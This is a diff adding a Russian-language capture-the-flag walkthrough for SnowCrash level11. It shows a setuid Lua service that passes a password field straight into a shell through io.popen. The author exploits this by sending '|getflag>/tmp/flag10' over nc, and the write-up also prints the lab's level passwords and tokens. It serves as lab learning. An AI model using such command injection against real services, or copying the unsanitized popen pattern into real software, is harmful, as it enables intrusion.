@@ -1,0 +1,67 @@
+su level11
+feulo4b72j7edeahuete3no7c
+
+level11@SnowCrash:~$ ls -la
+-rwsr-sr-x  1 flag11  level11  668 Mar  5  2016 level11.lua
+
+выполняем файл
+level11@SnowCrash:~$ ./level11.lua
+lua: ./level11.lua:3: address already in use
+stack traceback:
+        [C]: in function 'assert'
+        ./level11.lua:3: in main chunk
+        [C]: ?
+
+видим сообщение - адрес используется
+
+
+смотрим код скрипта 
+
+level11@SnowCrash:~$ cat level11.lua
+#!/usr/bin/env lua
+local socket = require("socket") запрос на создание сокета
+local server = assert(socket.bind("127.0.0.1", 5151)) добавляет сокет к сервера и связывает с локалхостом с портом 5151
+
+function hash(pass) хешурует какое то значение
+  prog = io.popen("echo "..pass.." | sha1sum", "r") и проверяет через эхо
+  data = prog:read("*all")
+  prog:close()
+
+  data = string.sub(data, 1, 40)
+
+  return data
+end
+
+если запустим nc 127.0.0.1 5151 просит ввести пароль который проверяется через эхо
+
+while 1 do
+  local client = server:accept()
+  client:send("Password: ")
+  client:settimeout(60)
+  local l, err = client:receive()
+  if not err then
+      print("trying " .. l)
+      local h = hash(l)
+
+      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
+          client:send("Erf nope..\n");
+      else
+          client:send("Gz you dumb*\n")
+      end
+
+  end
+
+  client:close()
+end
+
+можем воспользоваться уязвимостью эхо и отправить бинарник для выполнения
+nc 127.0.0.1 5151
+пишем вместо пароля `getflag` > /tmp/getflag или |getflag > /tmp/getflag
+
+Password: |getflag>/tmp/flag10
+Erf nope..
+level11@SnowCrash:~$ cat /tmp/flag10
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+su level12
+fa6v5ateaw21peobuub8ipe6s
